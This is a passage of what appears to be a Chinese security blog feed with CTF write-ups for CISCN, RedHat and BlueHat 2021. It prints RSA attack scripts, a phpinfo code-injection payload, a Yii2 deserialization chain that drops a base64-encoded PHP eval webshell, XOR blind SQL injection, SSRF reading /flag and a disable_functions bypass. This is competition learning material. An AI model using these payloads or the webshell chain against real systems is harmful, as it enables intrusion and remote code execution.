keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">1</span>                                              <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">for</span> i3 <span class="token keyword">in</span> num3<span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token number">0</span>                    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">1</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        <span class="token keyword">for</span> i4 <span class="token keyword">in</span> num4<span class="token punctuation">:</span>                            flag <span class="token operator">=</span> <span class="token number">0</span>                            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                    flag <span class="token operator">=</span> <span class="token number">1</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                <span class="token keyword">continue</span>                            <span class="token keyword">else</span><span class="token punctuation">:</span>                                <span class="token keyword">for</span> i5 <span class="token keyword">in</span> num5<span class="token punctuation">:</span>                                    <span class="token keyword">if</span> <span class="token punctuation">(</span>i4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">or</span> i4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">>=</span> i5<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                        <span class="token keyword">continue</span>                                    <span class="token keyword">else</span><span class="token punctuation">:</span>                                        flag <span class="token operator">=</span> <span class="token number">0</span>                                        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">if</span> <span class="token punctuation">(</span>i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i3<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">or</span> i5<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> i4<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                                flag <span class="token operator">=</span> <span class="token number">1</span>                                        <span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                                            <span class="token keyword">continue</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i1<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i2<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i3<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i4<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span>i5<span class="token punctuation">)</span>                                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'========================'</span><span class="token punctuation">)</span><span class="token comment">#################################</span></code></pre><p>[1, 4, 2, 5, 3]<br>[5, 3, 1, 4, 2]<br>[3, 5, 4, 2, 1]<br>[2, 1, 5, 3, 4]<br>[[4, 2, 3, 1, 5]</p><p>fill_number 会检查</p><pre class="language-none"><code class="language-none">map0000000000044000003000010</code></pre><p>最后 md5(1425353142350212150442315,32) &#x3D; 8a04b4597ad08b83211d3adfa1f61431</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> invert<span class="token punctuation">,</span> iroot<span class="token keyword">from</span> libnum <span class="token keyword">import</span> xgcd<span class="token punctuation">,</span> invmod<span class="token comment">#低解密指数攻击</span>n1<span class="token operator">=</span><span class="token number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>e1<span class="token operator">=</span><span class="token number">3</span>c1<span class="token operator">=</span><span class="token number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> iroot<span class="token punctuation">(</span>c1 <span class="token operator">+</span> i <span class="token operator">*</span> n1<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>        <span class="token keyword">break</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment">#共模攻击</span><span class="token keyword">import</span> time<span class="token keyword">import</span> gmpy2n <span class="token operator">=</span> <span class="token number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span>e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">]</span>c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><span class="token punctuation">,</span><span class="token number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><span class="token punctuation">]</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span>c1 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>c2 <span class="token operator">=</span> c<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>e1 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>e2 <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcdext<span class="token punctuation">(</span>e1<span class="token punctuation">,</span> e2<span class="token punctuation">)</span>s1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>s2 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">if</span> s1 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s1 <span class="token operator">=</span> <span class="token operator">-</span>s1    c1 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">elif</span> s2 <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    s2 <span class="token operator">=</span> <span class="token operator">-</span>s2    c2 <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>c2<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c2<span class="token punctuation">,</span> s2<span class="token punctuation">,</span> n<span class="token punctuation">)</span> <span class="token operator">%</span> n<span class="token keyword">print</span> <span class="token string">' [-]m is:'</span> <span class="token operator">+</span> <span class="token string">'&#123;:x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'\n[!]Timer:'</span><span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>clock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token keyword">print</span> <span class="token string">'[!]All Done!'</span><span class="token comment">#已知高位p攻击</span><span class="token triple-quoted-string string">"""已知高位p，利用网上的sage脚本，获取pn=113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147p=7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902pbits = 512kbits = pbits-p.nbits()p=p&lt;&lt;kbitsprint("upper %d bits (of %d bits) is given" % (pbits-kbits, pbits))PR.&lt;x> = PolynomialRing(Zmod(n))f = x + px0 = f.small_roots(X=2^kbits, beta=0.4)[0]print(p+x0)out:upper 312 bits (of 512 bits) is given11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423"""</span>c4 <span class="token operator">=</span> <span class="token number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span>e4 <span class="token operator">=</span> <span class="token number">65537</span>N4 <span class="token operator">=</span> <span class="token number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>p <span class="token operator">=</span> <span class="token number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span>q <span class="token operator">=</span> N4 <span class="token operator">//</span> pn <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e4<span class="token punctuation">,</span> n<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c4<span class="token punctuation">,</span>d<span class="token punctuation">,</span>N4<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>得到的16进制转md5即为flag值：</p><img src="/article/ciscn2021/image-20210517144130169.png" class="" title="image-20210517144130169" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>红帽杯2021</title>
      <link href="article/redhat2021/"/>
      <url>article/redhat2021/</url>
      
        <content type="html"><![CDATA[<p>Web体验还行，不是太难，压轴题很合理</p><span id="more"></span><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h3><p>题目没啥意思23333，还老是503</p><p>扫下目录，访问<code>robots.txt</code> ，得到<code>1ndexx.php</code>，访问页面500报错，应该是缺参数，既然这样那肯定要给源码(不然寄刀片伺候)</p><p>发现备份文件<code>.1ndexx.php.swp</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#Really easy...</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable 2 open!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hack</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hack.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Unable 2 open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you die"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">,</span><span class="token variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$hack</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>ban了一堆函数，先看看phpinfo</p><p>payload：</p><pre class="language-php" data-language="php"><code class="language-php">./?code=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>访问<code>hack.php</code></p><p>搜索字符串，结果发现flag写在了环境变量里，被phpinfo暴露出来了</p><img src="/article/redhat2021/image-20210509205559176.png" class="" title="web1flag" loading="lazy"><p>说实话，<code>1ndexx.php</code>和<code>index.php</code> 切换迷惑人，然后平台的问题，盲猜docker分发写环境变量，最后没删23333</p><hr><h3 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h3><p>扫到<code>www.zip</code>，看下是<a href="http://github.com/yiisoft/yii2/">Yii Framework2.0.32</a></p><p>去官网下原版比对一下，发现就改了个参数</p><h4 id="Yii2反序列化漏洞"><a href="#Yii2反序列化漏洞" class="headerlink" title="Yii2反序列化漏洞"></a><a href="https://www.cnblogs.com/thresh/p/13743081.html">Yii2反序列化漏洞</a></h4><p>拿poc直接打，由于base64后可能会有<code>/</code>或者<code>+</code>等，所以先base64一下写函数解码即可</p><p>system似乎被ban了不行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>rest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">CreateAction</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$checkAccess</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">checkAccess</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'assert'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"file_put_contents('1.php',base64_decode('PD9waHAgZXZhbCgkX1BPU1RbYV0pPz4='))"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Faker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>rest<span class="token punctuation">\</span>CreateAction</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Generator</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$formatters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 这里需要改为isRunning</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">formatters</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'isRunning'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">CreateAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'run'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// poc2</span><span class="token keyword">namespace</span> <span class="token package">Codeception<span class="token punctuation">\</span>Extension</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">Faker<span class="token punctuation">\</span>Generator</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RunProcess</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$processes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">processes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Generator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 生成poc</span>    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Codeception<span class="token punctuation">\</span>Extension<span class="token punctuation">\</span>RunProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>这里原poc打的参数是data，这里修改为message</p><img src="/article/redhat2021/image-20210509210754051.png" class="" title="message" loading="lazy"><p>打过去就行，虽然报错但是已经执行了</p><img src="/article/redhat2021/36771C01-40D6-4C62-A2C3-A38B1D6CE696.png" class="" title="poc" loading="lazy"><p>在当前目录会生成<code>1.php</code>，蚁剑连一下</p><img src="/article/redhat2021/image-20210509211521847.png" class="" title="getshell" loading="lazy"><p>发现有disable_function，当时心凉一截，不会和蓝帽一样…</p><p>侥幸心理测了下蚁剑的突破插件，发现<code>Apache_mod_cgi</code>可以，执行根目录下<code>/readflag</code>即可</p><img src="/article/redhat2021/image-20210509211350611.png" class="" title="web2flag" loading="lazy"><hr><h3 id="WebsiteManger"><a href="#WebsiteManger" class="headerlink" title="WebsiteManger"></a>WebsiteManger</h3><p>打开登陆界面，估计是注入</p><p>看看连接，发现异常请求，还好没上来对着<code>username</code>乱试</p><img src="/article/redhat2021/image-20210509212002489.png" class="" title="imagephp" loading="lazy"><p>经测试，可以使用异或 盲注</p><pre class="language-none"><code class="language-none">错误语句返回报错正确语句错误表达返回：WHAT ARE YOU DOING正确语句id为1返回图片正确语句id为0返回空</code></pre><img src="/article/redhat2021/image-20210509212509022.png" class="" title="1^1" loading="lazy"><img src="/article/redhat2021/image-20210509212527090.png" class="" title="1^0" loading="lazy"><img src="/article/redhat2021/image-20210509212645414.png" class="" title="error" loading="lazy"><p>异或盲注脚本跑，可见以前写的WP</p><p>拿到信息如下</p><pre class="language-none"><code class="language-none"># version&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;5.5.60-0+deb8u1# databases&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;ctf# tables&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;images,users# users.columns&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;username,password# users.data&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;admin~a1d4f79c94f0cd3feeac4</code></pre><p>似乎密码还是容器随机的，拿到用户名密码登陆</p><img src="/article/redhat2021/image-20210509213045341.png" class="" title="ssrf" loading="lazy"><p>明显ssrf，用file协议读一下文件可行，直接读flag</p><p>payload：</p><pre class="language-none"><code class="language-none">file:&#x2F;&#x2F;&#x2F;flag</code></pre><img src="/article/redhat2021/image-20210509213219524.png" class="" title="web3flag" loading="lazy">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯2021一道题——One_Pointer_PHP</title>
      <link href="article/bluehat2021/"/>
      <url>article/bluehat2021/</url>
      
        <content type="html"><![CDATA[<p>深入学习蓝帽杯web一道题</p><span id="more"></span><p>质量很高的一道题，详细写下做个总结，深入学习一下知识点</p><h2 id="WEB-One-Pointer-PHP"><a href="#WEB-One-Pointer-PHP" class="headerlink" title="WEB-One_Pointer_PHP"></a>WEB-One_Pointer_PHP</h2><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p>给了<code>www.zip</code>，部分源码，分析一下</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>反序列化<code>cookies-&gt;data</code>使其$count[++$user-&gt;count]&#x3D;1;后<code>$count[]=1</code>为false即可eval执行命令，伴随应该题目还有更多考点，测试如下。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token 